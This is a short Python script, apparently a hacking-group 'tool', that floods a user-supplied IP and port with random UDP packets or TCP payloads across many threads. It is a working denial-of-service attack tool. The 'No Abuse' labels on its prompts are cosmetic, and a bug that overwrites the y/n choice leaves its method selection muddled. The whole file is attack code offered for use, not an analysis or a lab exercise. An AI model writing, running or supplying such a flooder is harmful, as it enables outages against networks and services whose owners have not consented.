#!/usr/bin/env python3
#No Stealing Child
#Executive Team
import random
import socket
import threading
import os
import time
from time import sleep

os.system("clear")
print("Loading.. [ Wait For Second ]")
print("Verification [ Phone IP ]")
print("")

time.sleep(3)
os.system("clear")
print(" Seven Tools | Executive Present ")
ip = str(input(" No Abuse | Targets :"))
port = int(input(" No Abuse | Port :"))
choice = str(input(" No Abuse | Ready? (y/n) :"))
choice = str(input(" No Abuse | Methods [UDP] :"))
times = int(input(" No Abuse | Packets :"))
threads= int(input(" No Abuse | Threads :"))
def run():
	data = random._urandom(2017)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"[!] XSeven FT Executive [!]")
		except:
			print("[!] | Executive | Present |")

def run2():
	data = random._urandom(20017)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" [!] XSeven Warning! [ Don't Abuse ]")
		except:
			s.close()
			print("[!] Headers Downed")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
